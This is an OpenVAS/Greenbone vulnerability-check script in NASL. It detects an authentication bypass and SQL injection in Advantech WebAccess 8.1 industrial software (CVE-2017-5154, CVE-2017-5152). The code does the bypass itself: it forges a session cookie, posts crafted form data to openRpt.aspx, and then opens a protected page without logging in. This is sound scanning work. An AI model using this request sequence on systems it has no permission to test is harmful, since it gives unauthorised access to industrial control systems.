CPE = "cpe:/a:advantech:advantech_webaccess";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.140138" );
	script_bugtraq_id( 95410 );
	script_cve_id( "CVE-2017-5154", "CVE-2017-5152" );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_version( "2021-09-13T11:01:38+0000" );
	script_name( "Advantech WebAccess 'updateTemplate.aspx' SQL Injection and Authentication Bypass Vulnerabilities" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/bid/95410" );
	script_xref( name: "URL", value: "http://webaccess.advantech.com" );
	script_xref( name: "URL", value: "http://www.zerodayinitiative.com/advisories/ZDI-17-043/" );
	script_xref( name: "URL", value: "https://ics-cert.us-cert.gov/advisories/ICSA-17-012-01" );
	script_tag( name: "impact", value: "An attacker can exploit these issues to bypass certain security restrictions, perform
  unauthorized actions, modify the logic of SQL queries, compromise the software, retrieve information, or modify
  data, other consequences are possible as well." );
	script_tag( name: "vuldetect", value: "Try to bypass authentication by sending two special crafted requests." );
	script_tag( name: "solution", value: "Updates are available. Please see the references or vendor advisory for more information." );
	script_tag( name: "summary", value: "Advantech WebAccess is prone to an SQL-injection vulnerability and an authentication-bypass vulnerability." );
	script_tag( name: "affected", value: "WebAccess 8.1 is vulnerable, other versions may also be affected." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "qod_type", value: "remote_active" );
	script_tag( name: "last_modification", value: "2021-09-13 11:01:38 +0000 (Mon, 13 Sep 2021)" );
	script_tag( name: "severity_vector", value: "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H" );
	script_tag( name: "severity_origin", value: "NVD" );
	script_tag( name: "severity_date", value: "2017-11-03 01:29:00 +0000 (Fri, 03 Nov 2017)" );
	script_tag( name: "creation_date", value: "2017-01-31 16:34:49 +0100 (Tue, 31 Jan 2017)" );
	script_category( ACT_ATTACK );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2017 Greenbone Networks GmbH" );
	script_dependencies( "gb_advantech_webaccess_consolidation.sc" );
	script_mandatory_keys( "advantech/webaccess/detected" );
	script_require_ports( "Services/www", 80 );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("misc_func.inc.sc");
require("host_details.inc.sc");
if(!port = get_app_port( cpe: CPE, service: "www" )){
	exit( 0 );
}
if(!get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
vt_strings = get_vt_strings();
data = "projName=" + vt_strings["default"] + "&nodeName=" + vt_strings["default"] + "&waPath=C:\\\\WebAccess\\\\Node";
asp_session = "ASP.NET_SessionId=" + crap( data: rand_str( charset: "abcdefghijklmnopqrstuvwxyz", length: 1 ), length: 24 );
req = http_get_req( port: port, url: "/WaExlViewer/templateList.aspx", add_headers: make_array( "Cookie", asp_session ) );
buf = http_keepalive_send_recv( port: port, data: req, bodyonly: FALSE );
if(!ContainsString( buf, "signinonly.asp" )){
	exit( 0 );
}
req = http_post_put_req( port: port, url: "/WaExlViewer/openRpt.aspx", data: data, add_headers: make_array( "Cookie", asp_session, "Content-Type", "application/x-www-form-urlencoded" ) );
buf = http_keepalive_send_recv( port: port, data: req, bodyonly: FALSE );
if(!IsMatchRegexp( buf, "HTTP/1\\.. 200" )){
	exit( 99 );
}
req1 = http_get_req( port: port, url: "/WaExlViewer/templateList.aspx", add_headers: make_array( "Cookie", asp_session ) );
buf = http_keepalive_send_recv( port: port, data: req1, bodyonly: FALSE );
if(ContainsString( buf, "Template List" ) && ContainsString( buf, "function popupChangeTemplateDiv" ) && ContainsString( buf, "templateName" )){
	security_message( port: port, data: "It was possible to bypass authentication by sending two requests:\n\nRequest1:\n\n" + req + "\n\nRequest2:\n\n" + req1 + "\n\nResult (truncated):\n\n" + substr( buf, 0, 2000 ) + "\n[...]\n\n" );
	exit( 0 );
}
exit( 99 );

